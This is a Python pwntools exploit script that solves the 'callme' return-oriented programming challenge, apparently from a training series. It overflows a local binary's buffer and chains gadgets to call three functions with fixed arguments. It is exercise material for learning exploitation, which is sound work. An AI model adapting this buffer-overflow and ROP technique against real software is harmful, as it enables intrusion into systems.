from pwn import *
"""
Task:
    1. rop to call
Checksec:
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)


"""

def exploit():
    p = process("./callme")
    e = ELF('./callme')

    # proc.wait_for_debugger(p.pid)

    # gadget
    callme_one = e.symbols['callme_one']
    callme_two = e.symbols['callme_two']
    callme_three = e.symbols['callme_three']

    pop_rdi = 0x00000000004009a3            #arg1
    pop_rsi_pop_rdx = 0x000000000040093d    #arg2,arg3

    buf = b''
    buf += b"A"*0x28
    
    # callme_one(0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d)
    buf += p64(pop_rdi)             # setup arg1
    buf += p64(0xdeadbeefdeadbeef)  # arg1
    buf += p64(pop_rsi_pop_rdx)     # setup arg2, arg3
    buf += p64(0xcafebabecafebabe)  # arg2
    buf += p64(0xd00df00dd00df00d)  # arg3
    buf += p64(callme_one)          # call callme_one()

    # callme_two(0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d)
    buf += p64(pop_rdi)             # setup arg1
    buf += p64(0xdeadbeefdeadbeef)  # arg1
    buf += p64(pop_rsi_pop_rdx)     # setup arg2, arg3
    buf += p64(0xcafebabecafebabe)  # arg2
    buf += p64(0xd00df00dd00df00d)  # arg3
    buf += p64(callme_two)          # call callme_two()

    # callme_three(0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d)
    buf += p64(pop_rdi)             # setup arg1
    buf += p64(0xdeadbeefdeadbeef)  # arg1
    buf += p64(pop_rsi_pop_rdx)     # setup arg2, arg3
    buf += p64(0xcafebabecafebabe)  # arg2
    buf += p64(0xd00df00dd00df00d)  # arg3
    buf += p64(callme_three)          # call callme_three()

    p.recvuntil(">")
    p.sendline(buf)

    p.interactive()

exploit()